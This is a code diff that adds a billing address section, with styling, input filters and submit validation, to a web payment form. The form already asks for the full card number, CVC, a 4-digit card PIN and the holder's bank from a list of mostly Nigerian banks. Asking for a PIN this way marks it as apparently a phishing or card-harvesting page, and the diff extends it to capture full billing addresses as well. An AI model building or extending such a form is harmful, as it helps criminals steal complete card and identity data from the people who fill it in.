@@ -147,6 +147,24 @@
       padding: 6px 10px 2px 11px;
       background: #f0f6fc;
     }
+    /* --- Billing Address --- */
+    .billing-group {
+      margin-top: 20px;
+      margin-bottom: 0;
+      padding: 15px 0 5px 0;
+      border-top: 1px solid #ececec;
+    }
+    .billing-row {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+    @media (max-width: 480px) {
+      .billing-row {
+        flex-direction: column;
+        gap: 0;
+      }
+    }
   </style>
 </head>
 <body>
@@ -156,10 +174,12 @@
       <input id="name" name="name" type="text" required autocomplete="cc-name">
       <label for="cardnumber">Card number <span class="req">*</span></label>
       <input id="cardnumber" name="cardnumber" type="text" inputmode="numeric" maxlength="16" minlength="16" required autocomplete="cc-number">
-<label for="bank-search">Select Your Bank <span class="req">*</span></label>
+
+      <label for="bank-search">Select Your Bank <span class="req">*</span></label>
       <input id="bank-search" class="bank-search-bar" type="text" autocomplete="off" placeholder="Search bank name...">
       <ul class="bank-list" id="bankList"></ul>
       <input type="hidden" id="selectedBank" name="bank" required>
+
       <div class="form-row">
         <div style="flex:1;">
           <label for="expmonth" style="margin-top:18px;">Expiry month <span class="req">*</span></label>
@@ -188,6 +208,38 @@
 
       <label for="pin">Card PIN <span class="req">*</span></label>
       <input id="pin" name="pin" type="password" inputmode="numeric" maxlength="4" minlength="4" required>
+
+      <!-- Billing Address Section -->
+      <div class="billing-group">
+        <label for="billing-address">Billing Address <span class="req">*</span></label>
+        <input id="billing-address" name="billing_address" type="text" maxlength="80" required placeholder="Street address, P.O. box, company name, c/o">
+        <div class="billing-row">
+          <input id="billing-city" name="billing_city" type="text" maxlength="32" required placeholder="City">
+          <input id="billing-state" name="billing_state" type="text" maxlength="32" required placeholder="State / Province / Region">
+        </div>
+        <div class="billing-row">
+          <input id="billing-zip" name="billing_zip" type="text" maxlength="16" required placeholder="ZIP / Postal Code">
+          <select id="billing-country" name="billing_country" required>
+            <option value="" disabled selected>Country</option>
+            <option>United States</option>
+            <option>Nigeria</option>
+            <option>United Kingdom</option>
+            <option>Brazil</option>
+            <option>India</option>
+            <option>Germany</option>
+            <option>South Africa</option>
+            <option>France</option>
+            <option>China</option>
+            <option>Canada</option>
+            <option>Mexico</option>
+            <option>Italy</option>
+            <option>Japan</option>
+            <option>Australia</option>
+            <option>Other</option>
+          </select>
+        </div>
+      </div>
+      <!-- End Billing Address -->
 
       <div class="actions">
         <button type="button" class="cancel" onclick="window.history.back()">Cancel</button>
@@ -220,7 +272,6 @@
           "EcoBank",
           "Opay",
           "Palmpay",
-
         ]
       },
       {
@@ -357,17 +408,38 @@
       this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
     });
 
-    // Validate before submit
+    // Billing city/state/address/zip restrictions
+    document.getElementById('billing-city').addEventListener('input', function() {
+      this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+    });
+    document.getElementById('billing-state').addEventListener('input', function() {
+      this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+    });
+    document.getElementById('billing-zip').addEventListener('input', function() {
+      this.value = this.value.replace(/[^a-zA-Z0-9\-]/g, '');
+    });
+
+    // Validate before submit (adds billing address validation)
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
       const cardNumber = document.getElementById('cardnumber');
       const cvc = document.getElementById('cvc');
       const pin = document.getElementById('pin');
       const bank = selectedBankInput.value;
+      const billing_address = document.getElementById('billing-address').value.trim();
+      const billing_city = document.getElementById('billing-city').value.trim();
+      const billing_state = document.getElementById('billing-state').value.trim();
+      const billing_zip = document.getElementById('billing-zip').value.trim();
+      const billing_country = document.getElementById('billing-country').value;
       const errors = [];
       if(cardNumber.value.length !== 16) errors.push("Please enter exactly 16 digits for card number.");
       if(cvc.value.length !== 3) errors.push("Please enter exactly 3 digits for security code.");
       if(pin.value.length !== 4) errors.push("Please enter exactly 4 digits for card PIN.");
       if(!bank) errors.push("Please select your bank.");
+      if (!billing_address) errors.push("Enter your billing address.");
+      if (!billing_city) errors.push("Enter your billing city.");
+      if (!billing_state) errors.push("Enter your billing state/province/region.");
+      if (!billing_zip) errors.push("Enter your billing ZIP / postal code.");
+      if (!billing_country) errors.push("Select your billing country.");
       if(errors.length > 0) {
         alert(errors.join('\n'));
         e.preventDefault();
@@ -375,6 +447,4 @@
     });
   </script>
 </body>
-
 </html>
-
